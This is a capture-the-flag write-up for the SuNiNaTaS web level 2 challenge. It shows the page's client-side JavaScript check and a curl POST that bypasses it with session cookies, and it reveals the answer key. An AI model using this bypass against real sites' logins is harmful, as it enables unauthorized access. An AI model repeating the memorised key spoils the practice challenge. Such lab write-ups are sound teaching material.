# Level 2   JS Bypass

Challenge: [http://suninatas.com/challenge/web02/web02.asp](http://suninatas.com/challenge/web02/web02.asp)

![level-2.png](/assets/ctf/suninatas/web/level-2.png)

Looks like we have to bypass the authentication. 

HTML has some comments:
```html
<script>
	function chk_form(){
		var id = document.web02.id.value ;
		var pw = document.web02.pw.value ;
		if ( id == pw ) {
			alert("You can't join! Try again");
			document.web02.id.focus();
			document.web02.id.value = "";
			document.web02.pw.value = "";
		}
		else {
			document.web02.submit();
		}
	}
</script>
<!-- Hint : Join / id = pw -->
<!-- M@de by 2theT0P -->
```

Authentication mechanism is based on frontend check with JavaScript. 

We can directly make curl request and ignore it (or use Burpsuite)
```bash
└─$ curl 'http://suninatas.com/challenge/web02/web02.asp' -H 'Cookie: ASP.NET_SessionId=rrcvgq2pu1nnz1ezi35dgzac; ASPSESSIONIDQCRCTCAD=KIFNCODBIAKOGECFEFOEINLN' -d 'id=x&pw=x' -s | grep 'Auth'
                <td colspan="2" align="center" bgcolor="cccccc">Authkey : Bypass javascript</td>
```

```bash
curl 'http://suninatas.com/challenge/web02/web02.asp' \
  -H 'Cookie: ASP.NET_SessionId=rrcvgq2pu1nnz1ezi35dgzac; ASPSESSIONIDQCRCTCAD=KIFNCODBIAKOGECFEFOEINLN' \
  -d 'id=x&pw=x' -s | grep 'Auth'
<td colspan="2" align="center" bgcolor="cccccc">Authkey : Bypass javascript</td>
```

> Authkey: `Bypass javascript`



